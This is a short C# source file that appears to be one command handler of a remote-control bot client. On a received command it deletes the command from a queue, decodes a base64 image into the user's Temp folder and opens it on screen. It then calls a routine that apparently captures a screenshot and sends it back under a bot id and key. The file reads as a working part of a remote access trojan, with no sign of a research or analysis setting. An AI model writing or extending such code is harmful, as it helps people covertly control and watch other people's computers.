using System.Diagnostics;
using System.Threading;

namespace ConsoleApp3
{
    internal class cmd_OpenImage
    {
        public void OpenImage(string image, string bot_id, string key, string pc_name)
        {
            post_req post_req = new post_req();
            post_req.delCommand(key, bot_id);

            Base64 base64 = new Base64();
            base64.FromBase64_Image(image, pc_name);
            Process.Start($"C:\\Users\\{pc_name}\\AppData\\Local\\Temp\\image.png");

            Thread.Sleep(1500);

            cmd_GetScreenshot cmd_GetScreenshot = new cmd_GetScreenshot();
            cmd_GetScreenshot.GetScreenshot(key, bot_id, pc_name);
        }
    }
}
